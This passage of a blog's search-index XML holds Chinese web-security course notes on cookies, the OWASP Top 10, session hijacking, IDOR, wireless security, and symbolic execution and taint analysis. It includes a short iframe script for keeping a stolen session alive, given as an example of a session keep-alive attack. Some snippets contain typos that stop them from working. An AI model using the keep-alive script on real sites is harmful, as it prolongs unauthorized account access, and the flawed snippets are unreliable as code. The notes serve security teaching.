setcookie(&quot;uname&quot;,$username);//创建一个索引为uname的cookie</span><br><span class="line">       echo &quot;&lt;br&gt;OK&lt;br&gt;&quot;; </span><br><span class="line"> &#125; else &#123; </span><br><span class="line">       echo &quot;&lt;br&gt;false&lt;br&gt;&quot;;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line">//在loginok.php中对应修改</span><br></pre></td></tr></table></figure><p>可以通过<code>$HTTP_COOKIE_VARS[“uname”] 或 $_COOKIE[“ uname ”]</code>来访问索引为name的 cookie 的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if ($_COOKIE[&quot;uname&quot;]null)</span><br><span class="line">  echo &quot;should cookie&quot;;</span><br><span class="line">else</span><br><span class="line">  echo &quot;ok&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">//在show.php中对应修改</span><br></pre></td></tr></table></figure><p>由于示例所使用的是内存COOKIE，<strong>即没有设定COOKIE值的expires参数</strong>，也就是没有设置COOKIE的失效时间情况下，这个COOKIE在关闭浏览器后将失效，并且不会保存在本地。验证：关闭浏览器后，重新打开浏览器直接访问useCookie.php，则发现，提示should cookie。</p><p><strong>设置Cookie有效期</strong></p><p>修改示例中的COOKIE类型为设置expires参数</p><blockquote><p>即COOKIE的值指定了失效时间，比如<br>setcookie(“uname”,$username, time()+3600<em>24</em>30)，<br>那么这个COOKIE 会保存在本地，关闭浏览器后再访问网站useCookie.php，则发现，提示ok。<br>可见：在COOKIE有效时间内所有的请求都会带上这个本地保存COOKIE。 </p></blockquote><p>结论：如果一个页面依赖于某个cookie，而cookie的值或者文件被泄露后，即使没有登录，也可能利用该cookie来访问该页面，这就是<strong>cookie在客户端不安全引发的后果</strong>。</p><p><img src="/2023/03/16/web-an-quan-ji-chu/f5dea29e0330b0e7490316db0ecfd88e.png" class="lazyload placeholder" data-srcset="/2023/03/16/web-an-quan-ji-chu/f5dea29e0330b0e7490316db0ecfd88e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h1 id="十大WEB安全威胁"><a href="#十大WEB安全威胁" class="headerlink" title="十大WEB安全威胁"></a>十大WEB安全威胁</h1><p>根据2010年OWASP（开放Web软件安全项目—Open Web Application Security Project）发布的Web应用十大安全威胁排名，排在前十位的安全风险依次为：<strong>注入</strong>、<strong>跨站脚本</strong>、遭破坏的身份认证和会话管理、不安全的直接对象引用、<strong>伪造跨站请求</strong>、安全配置错误、不安全的加密存储、没有限制的URL访问、传输层保护不足和未验证的重定向和转发。</p><h2 id="遭破坏的身份认证和会话管理"><a href="#遭破坏的身份认证和会话管理" class="headerlink" title="遭破坏的身份认证和会话管理"></a>遭破坏的身份认证和会话管理</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>“遭破坏的认证和会话管理”是指攻击者窃听了用户访问HTTP时的用户名和密码，或者是用户的会话，从而得到sessionID或用户身份信息，进而冒充用户进行HTTP访问的过程。</p><p>由于HTTP本身是<strong>无状态</strong>的，HTTP的每次访问请求都要带有个人凭证，SessionID是用户访问请求的凭证。sessionID本身很容易在网络上被嗅探到，所以攻击者往往通过<strong>监听sessionID</strong>来实现进一步的攻击，这就是这种安全风险居高不下的重要原因，但这种形式的攻击主要针对身份认证和会话。</p><h2 id="密码的安全性"><a href="#密码的安全性" class="headerlink" title="密码的安全性"></a>密码的安全性</h2><p>密码（口令）是最常见的一种认证手段，持有正确密码的人被认为是可信的。使用密码进行认证的优点是成本低，认证过程实现简单。缺点是密码认证是一种比较弱的安全手段，因而存在被猜解的可能。 </p><p>目前黑客们常用的破解密码手段，不是暴力破解，而是使用一些弱口令去尝试进行<strong>字典攻击破解</strong>，比如123456，admin等，同时猜解用户名，直到发现使用这些弱口令的账户为止。由于用户名往往是公开的信息，攻击者可以收集一份用户名的字典，这种攻击成本很低，然而效果却很好。密码的保存也有一些需要注意的地方，例如，密码必须使用不可逆的加密算法或者是单向散列函数算法进行加密后存储到数据库中。这可以最大程度地保证密码的私密性。 </p><h3 id="用户的认证必须通过加密信道进行传输"><a href="#用户的认证必须通过加密信道进行传输" class="headerlink" title="用户的认证必须通过加密信道进行传输"></a>用户的认证必须通过加密信道进行传输</h3><p>在用户登录时，在用户输入用户名和密码后一般通过<strong>POST</strong>的方法进行传输，认证信息可通过不安全的HTTP传递，也可通过加密的HTTPS传递。有些网站在登录页面显示的是HTTPS，而事实上却是用HTTP。</p><p>检测是否使用HTTPS的最简单方法就是使用网络嗅探工具，如通过SnifferPro或Ethereal嗅探数据包来判断是否加密。 </p><h3 id="会话劫持攻击"><a href="#会话劫持攻击" class="headerlink" title="会话劫持攻击"></a>会话劫持攻击</h3><p>SessionID一旦在生命周期内被窃取，就等于账户失窃。由于SessionID是用户登录持有的认证凭证，因此黑客不需要再想办法通过用户名和密码进行登录，而是直接使用窃取的SessionID与服务器进行交互。</p><p>会话劫持就是一种窃取用户SessionID后，使用该SessionID登录进入目标账户的攻击方法，此时攻击者实际上是利用了目标账户的有效Session。如果SessionID是被保存在Cookie中，则这种攻击被称为<strong>Cookie劫持</strong>。 </p><h3 id="会话保持攻击"><a href="#会话保持攻击" class="headerlink" title="会话保持攻击"></a>会话保持攻击</h3><p>Session是有生命周期的，当用户长时间未活动后，或者用户点击退出后，服务器将销毁Session。如果攻击者窃取了用户的Session，并一直保持一个有效的Session（比如间隔性地刷新页面，以使服务器认为这个用户仍然在活动），而服务器对于活动的Session也一直不销毁，攻击者就能通过此有效Session一直使用用户的账户，即成为一个永久的“后门”，这就是会话保持攻击。</p><p>下面一段代码可以保持session长期有效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var url=”http://bbs.example.com/index.php?sid=1”;</span><br><span class="line">Window.setInterval(“keepsid()”,6000);//按照指定的周期（以毫秒计）来调用函数或计算表达式</span><br><span class="line">Fuction keepsid()</span><br><span class="line">&#123;</span><br><span class="line">   Document.getElementById(“a1”).src=url+”&amp;time=”+Math.random();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe id=”a1” src=””&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><blockquote><p>IFrame内联框架被用来在当前 HTML 文档中嵌入另一个文档。其原理就是不停地刷新页面，以保持Session不过期。</p></blockquote><h2 id="不安全的直接对象引用"><a href="#不安全的直接对象引用" class="headerlink" title="不安全的直接对象引用"></a>不安全的直接对象引用</h2><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><p>不安全的直接对象引用在OWASP TOP 10排名中居于第四位，它可以被归于访问控制一类威胁。</p><p><strong>直接对象引用</strong>：是指WEB应用程序的开发人员将一些不应公开的对象引用直接暴露给用户，使得用户可以通过更改URL等操作直接引用对象。</p><p><strong>不安全的直接对象引用</strong>：是指一个用户通过更改URL等操作可以成功访问到未被授权的内容。比如一个网站上的用户通过更改URL可以访问到其他用户的私密信息和数据等。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String query=”SELECT * FROM accts WHERE account=?”;</span><br><span class="line">PreparedStatement pstmt=connection.prepareStatement(query, ...);</span><br><span class="line">pstmt.setString(1,request.getParameter(“acct”));</span><br><span class="line">ResultSet results=pstmt.executeQuery();</span><br></pre></td></tr></table></figure><p>代码中通过一个未被验证的用户账号来获取相关数据，在这样的情况下，攻击者可以通过在浏览器中简单修改“acct”参数的值发送到不同的用户账号来获取信息。 </p><h2 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h2><p>举例：未能及时对软件进行更新，默认的用户名密码没有及时修改等等。</p><h2 id="不安全的加密存储"><a href="#不安全的加密存储" class="headerlink" title="不安全的加密存储"></a>不安全的加密存储</h2><p>所谓不安全的加密存储指的是Web应用系统<strong>没有对敏感性资料进行加密</strong>，或者采用的加密算法复杂度不高可以被轻易破解，或者加密所使用的密钥非常容易检测出来。<br>举例：CSDN网站泄密、Facebook用户信息泄密等</p><h2 id="传输层保护不足"><a href="#传输层保护不足" class="headerlink" title="传输层保护不足"></a>传输层保护不足</h2><p>当传输层没有进行安全保护时，会遇到下面的安全威胁：</p><ul><li>会话劫持<blockquote><p>HTTP是无状态协议，客户端和服务端并没有建立长连接。服务器为了识别用户连接，服务器会发送给客户端SessionID。如果传输层保护不足，攻击就可以通过嗅探的方法获取传输内容，提取SessionID，冒充受害者发送请求。</p></blockquote></li><li>中间人攻击<blockquote><p>中间人攻击(Man-in-the-middle attack)，即MITM。HTTP连接的目标是Web服务器，如果传输层保护不足，攻击者可以担任中间人的角色，在用户和Web服务器之间截获数据并在两者之间进行转发，使用户和服务器之间的整个通信过程暴露在攻击者面前。</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线网安全性</title>
      <link href="/2023/03/16/wu-xian-wang-an-quan-xing/"/>
      <url>/2023/03/16/wu-xian-wang-an-quan-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="无线局域网标准"><a href="#无线局域网标准" class="headerlink" title="无线局域网标准"></a>无线局域网标准</h2><p><strong>无线局域网体系结构</strong></p><ul><li><p>两种体系结构</p><ul><li>固定无线局域网：可与有线网相连</li><li>特定无线局域网（点对点）：不与任何固定的有线网相连</li></ul></li><li><p>含有无线通信设备的装置通常称为<strong>移动站STA</strong>（手机、笔记本）</p><ul><li>根据IEEE802.11通信标准，每台STA由一个48比特MAC地址唯一确定</li></ul></li><li><p>无线接入点(AP)</p><ul><li>一端：与一个<strong>有线局域网</strong>建立连接</li><li>另一端：与<strong>多台STA</strong>之间建立<strong>无线通信连接</strong></li><li>每个AP由一个**服务集标识符(SSID)**唯一确定</li></ul></li></ul><br/><p><strong>固定无线局域网示意图</strong></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/ce99d33abcc12bfea3b4c8289b58c726.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/ce99d33abcc12bfea3b4c8289b58c726.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>信标发送：AP定时对外公布其SSD及其他信息，为进入其覆盖范围内的STA与其建立连接之用。</li><li>信标扫描：STA定期扫描信标，决定与哪个AP相连后，然后向该AP(通过其SSID)发出连接请求。</li></ul><br/><p><strong>特定无线局域网</strong></p><p><strong>传感器网络或者无线自组网</strong></p><ul><li>不与任何固定的网络基础设施相连</li><li>不包含AP</li><li>允许不同的STA直接通信</li><li>若目标STA不在通信范围内，可根据情况使用若干其他STA作为中转站建立通信路径</li></ul><br/><p><strong>802.11概述</strong></p><p>802.11是<strong>无线局域网通信标准</strong>，规定了无线局域网在<strong>MAC子层和物理层</strong>的通信及安全保护机制</p><p>802.11包含一些列协议：</p><ul><li>802.11a：5Ghz</li><li>802.11b：2.4Ghz，11Mbps，WEP</li><li>802.11g：2.4Ghz，54Mbps</li><li>802.11i：WPA2</li><li>802.11n：支持MIMO</li></ul><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/38849c64b0476c471d588b18a6462b16.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/38849c64b0476c471d588b18a6462b16.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>无线通信的安全性弱点</strong></p><ol><li>无线通信更易于被<strong>侦听</strong>（只要攻击者与被攻击接入到同一个无线网)</li><li>无线信号比有线信号更容易<strong>受干扰</strong>，且在无线媒体中更容易注入无线信号</li><li>无线计算装置和嵌入式系统的计算能力和电池能源有限，<strong>不足以执行复杂运算</strong></li></ol><br/><h2 id="有限等价隐私协议"><a href="#有限等价隐私协议" class="headerlink" title="有限等价隐私协议"></a>有限等价隐私协议</h2><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/2c4c26d7a12c9ed19e49ea80529295b9.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/2c4c26d7a12c9ed19e49ea80529295b9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/ea3ad43a044578133442075a05835690.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/ea3ad43a044578133442075a05835690.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/c421ee41400517e57d9eed4a383c10e5.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/c421ee41400517e57d9eed4a383c10e5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/4ea892a7bf55b3066790625caa2a83cc.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/4ea892a7bf55b3066790625caa2a83cc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/a1f942a762322b0c6b8e7c8947a53232.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/a1f942a762322b0c6b8e7c8947a53232.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/8a9e5f27bab3f4a4230a608808677896.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/8a9e5f27bab3f4a4230a608808677896.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/ed859dff10e2ffd92ad2aec5ab8bffbe.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/ed859dff10e2ffd92ad2aec5ab8bffbe.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/8001e3255505a703400b3c19bcfc7148.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/8001e3255505a703400b3c19bcfc7148.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/a39a097c5b0180bc23bd4c8965edd6b5.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/a39a097c5b0180bc23bd4c8965edd6b5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/e875b38c648db5d72771533792e7471b.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/e875b38c648db5d72771533792e7471b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/0f2de7445ea00e164ad1008a241e2885.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/0f2de7445ea00e164ad1008a241e2885.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">  <img src="/2023/03/16/wu-xian-wang-an-quan-xing/f8b8f4384e5180b8aa714a11f9a48d42.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/f8b8f4384e5180b8aa714a11f9a48d42.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/ccfde637362a31c160b3beaa32f6d65a.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/ccfde637362a31c160b3beaa32f6d65a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="蓝牙安全机制"><a href="#蓝牙安全机制" class="headerlink" title="蓝牙安全机制"></a>蓝牙安全机制</h2><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/c180b6bff0400ec5e4f83a1fa5e56124.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/c180b6bff0400ec5e4f83a1fa5e56124.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/45bb2f3474e884a14a0154de79b09e9e.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/45bb2f3474e884a14a0154de79b09e9e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/46d4b3758084e7be4f3ec47a2ec0ddd0.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/46d4b3758084e7be4f3ec47a2ec0ddd0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/da765611cc3f8cca1704c22eee1cc687.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/da765611cc3f8cca1704c22eee1cc687.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/210146b5b3c8c6ec08dd74a3bdab9a3a.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/210146b5b3c8c6ec08dd74a3bdab9a3a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/f4c8ca98d64407d3e8885904e264d865.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/f4c8ca98d64407d3e8885904e264d865.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/ab9de6b54e8ff699f553556c9240fdae.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/ab9de6b54e8ff699f553556c9240fdae.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/c7f470d3b12aba4f83b217c4e2e4f690.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/c7f470d3b12aba4f83b217c4e2e4f690.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/ad0c56385b3686a186f842d535a7f17c.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/ad0c56385b3686a186f842d535a7f17c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/100e6a5d9373ae43caf460e3590e06c4.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/100e6a5d9373ae43caf460e3590e06c4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/519f6d928b6746d90009440723e33ead.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/519f6d928b6746d90009440723e33ead.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/7c0fe60c4b8d857fdd4cb8280de9fadd.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/7c0fe60c4b8d857fdd4cb8280de9fadd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/16/wu-xian-wang-an-quan-xing/e55dcfa2302279ddb22222e3e44c1815.png" class="lazyload placeholder" data-srcset="/2023/03/16/wu-xian-wang-an-quan-xing/e55dcfa2302279ddb22222e3e44c1815.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全协议 </tag>
            
            <tag> 无线网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘篇</title>
      <link href="/2023/03/15/lou-dong-wa-jue-pian/"/>
      <url>/2023/03/15/lou-dong-wa-jue-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="方法概述"><a href="#方法概述" class="headerlink" title="方法概述"></a>方法概述</h1><h2 id="漏洞挖掘方法分类"><a href="#漏洞挖掘方法分类" class="headerlink" title="漏洞挖掘方法分类"></a>漏洞挖掘方法分类</h2><h3 id="静态分析技术"><a href="#静态分析技术" class="headerlink" title="静态分析技术"></a>静态分析技术</h3><p>方法：词法分析、数据流分析、控制流分析、模型检查、定理证明、<strong>符号执行</strong>、<strong>污点传播分析</strong>等。</p><p>不需要运行程序、分析效率高、资源消耗低</p><h3 id="动态分析技术"><a href="#动态分析技术" class="headerlink" title="动态分析技术"></a>动态分析技术</h3><p>方法：模糊测试、动态<strong>污点分析</strong>、动态<strong>符号执行</strong>等</p><p>需要运行程序、准确率非常高、误报率很低</p><p>符号执行和污点分析两类技术都分别支持静态分析和动态分析</p><h2 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h2><p><strong>符号执行</strong>（Symbolic Execution）的基本思路是<u>使用符号值替代具体值，模拟程序的执行</u>。在模拟程序运行的过程中，符号执行引擎会收集程序中的语义信息，探索程序中的可达路径、分析程序中隐藏的错误。<br>动态符号执行结合了真实执行和传统符号执行技术的优点，在真实执行的过程中同时进行符号执行，可以在保证测试精度的前提下提升了执行效率。</p><h3 id="符号执行的基本原理"><a href="#符号执行的基本原理" class="headerlink" title="符号执行的基本原理"></a>符号执行的基本原理</h3><p>符号执行三个关键点是<strong>变量符号化</strong>、<strong>程序执行模拟</strong>和<strong>约束求解</strong>。<br><u>变量符号化</u>是指用一个符号值表示程序中的变量，所有与被符号化的变量相关的变量取值都会用符号值或符号值的表达式表示。<br><u>程序执行模拟</u>最重要的是运算语句和分支语句的模拟：</p><ul><li>对于运算语句，由于符号执行使用符号值替代具体值，所以无法直接计算得到一个明确的结果，需要<strong>使用符号表达式的方式表示变量的值</strong>。</li><li>对于分支语句，每当遇到分支语句，原先的一条路径就会分裂成多条路径，符号执行会记录每条分支路径的约束条件。最终，通过采用合适的路径遍历方法，符号执行可以<strong>收集到所有执行路径的约束条件表达式</strong>。</li></ul><p><u>约束求解</u>主要负责路径可达性进行判定及测试输入生成的工作。对一条路径的约束表达式，可以采用约束求解器进行求解：</p><ul><li>如有解，该路径是可达的，可以得到到达该路径的输入</li><li>如无解，该路径是不可达的，也无法生成到达该路径的输入</li></ul><p>符号执行有<u>代价小、效率高</u>的优点，然而由于程序执行的可能路径随着程序规模的增大呈指数级增长，从而导致符号执行技术在分析输入和输出之间关系时，存在一个路径状态空间的<strong>路径爆炸</strong>问题。由于符号执行技术进行路径敏感的遍历式检测，当程序执行路径的数量超过约束求解工具的求解能力时，符号执行技术将难以分析。</p><h3 id="符号执行的应用"><a href="#符号执行的应用" class="headerlink" title="符号执行的应用"></a>符号执行的应用</h3><p>符号执行已经广泛应用在软件测试、漏洞挖掘和软件破解等。</p><p>在<strong>软件测试</strong>中，符号执行可以获得程序执行路径的集合、路径的约束条件和输出的符号表达式，可以使用约束求解器求解出满足约束条件的各个路径的输入值，用于创建高覆盖率的测试用例。符号执行与模糊测试的结合也是当前流行的软件测试技术。<br>在<strong>漏洞挖掘</strong>中，通过符号执行技术可以获得漏洞监测点的变量符号表达式，结合路径约束条件、变量符号表达式和漏洞分析规则，可以通过约束求解的方法来求解是否存在满足或违反漏洞分析规则的值。<br>符号执行还可以用于搜索特定目标代码的到达路径，进而计算该路径的输入，用在面向特定任务（比如<strong>代码破解</strong>）的程序分析中。</p><h3 id="漏洞挖掘-检测是否数组越界"><a href="#漏洞挖掘-检测是否数组越界" class="headerlink" title="漏洞挖掘-检测是否数组越界"></a>漏洞挖掘-检测是否数组越界</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int a[10];</span><br><span class="line">scanf(&quot;%d&quot;, &amp;i);</span><br><span class="line">if (i &gt; 0) &#123;</span><br><span class="line">  if (i &gt; 10)</span><br><span class="line">    i = i % 10;</span><br><span class="line">  a[i] = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在a[i]=1语句处存在可能数组越界的情况<br>访问越界的约束条件是x&gt;=10 </li><li>整段代码存在两个if分支，经过符号执行，知道到达a[i]=1语句处有2条路径：<br>路径约束条件为x&gt;0∧x&lt;=10，此时变量i的符号表达式为x；<br>路径约束条件为x&gt;0∧x&gt;10，此时变量i的符号表达式为x%10。</li><li>得到两个判定条件：<br>(x&gt;0∧x&lt;=10)∧(x&gt;=10)   –有解 x=10 满足越界条件** 存在漏洞**<br>(x&gt;0∧x&gt;10)∧x%10&gt;=10)</li></ul><h2 id="污点分析"><a href="#污点分析" class="headerlink" title="污点分析"></a>污点分析</h2><p><strong>污点分析</strong>（Taint Analysis）通过<u>标记程序中的数据（外部输入数据或者内部数据）为污点</u>，跟踪程序处理污点数据的内部流程，进而帮助人们进行深入的程序分析和理解。</p><p>污点分析可以分为污点传播分析（静态分析）和动态污点分析（动态分析）。静态污点分析技术在检测时<strong>并不真正运行程序</strong>，而是通过模拟程序的执行过程来传播污点标记，而动态污点分析技术需要运行程序，同时<strong>实时传播并检测污点标记</strong>。</p><h3 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h3><p><strong>首先，确定污点源</strong>，即污点分析的目标来源。通常来讲，污点源表示了程序外部数据或者用户所关心的程序内部数据，是需要进行标记分析的输入数据。 </p><p><strong>然后，标记和分析污点</strong>。对污点源在内存中进行标记、计算涉及到污点的执行过程。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/ad59398cd44ce5524b593fa029934299.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/ad59398cd44ce5524b593fa029934299.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="污点分析核心要素"><a href="#污点分析核心要素" class="headerlink" title="污点分析核心要素"></a>污点分析核心要素</h3><ul><li><strong>污点源</strong>：是污点分析的目标来源（<strong>Source点</strong>），通常表示来自程序外部的不可信数据，包括硬盘文件内容、网络数据包等。</li><li><strong>传播规则</strong>：是污点分析的计算依据，通常包括<strong>污点扩散规则</strong>和<strong>清除规则</strong>，其中普通赋值语句、计算语句可使用扩散规则，而常值赋值语句则需要利用清除规则进行计算。</li><li><strong>污点检测</strong>：是污点分析的功能体现，其通常在程序执行过程中的敏感位置（<strong>Sink点</strong>）进行<strong>污点判定</strong>，而敏感位置主要包括程序跳转和系统函数调用等。</li></ul><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>污点分析的核心是分析输入参数和执行路径之间的关系，它<strong>适用于由输入参数引发漏洞的检测</strong>，比如SQL注入漏洞等。</p><p>污点分析技术具有<strong>较高的分析准确率</strong>，然而针对大规模代码的分析，由于<strong>路径数量较多</strong>，因此其分析的性能会受到较大的影响。</p><h1 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>词法分析通过对代码<strong>进行基于文本或字符标识的匹配分析对比</strong>，以查找<strong>符合特定特征和词法规则</strong>的危险函数、API或简单语句组合。</p><p><strong>主要思想</strong>是将代码文本与归纳好的缺陷模式（比如边界条件检查）进行匹配，以此发现漏洞。<br><strong>优点</strong>：算法简单，检测性能较高<br><strong>缺点</strong>：只能进行表面的词法检测，不能进行语义方面的深层次分析，因此可以检测的安全缺陷和漏洞较少，会出现<strong>较高的漏报和误报</strong>，尤其对于高危漏洞无法进行有效检测。</p><h2 id="漏洞挖掘实战"><a href="#漏洞挖掘实战" class="headerlink" title="漏洞挖掘实战"></a>漏洞挖掘实战</h2><h3 id="实践一：基于词法分析和逆向分析的可执行代码静态检测"><a href="#实践一：基于词法分析和逆向分析的可执行代码静态检测" class="headerlink" 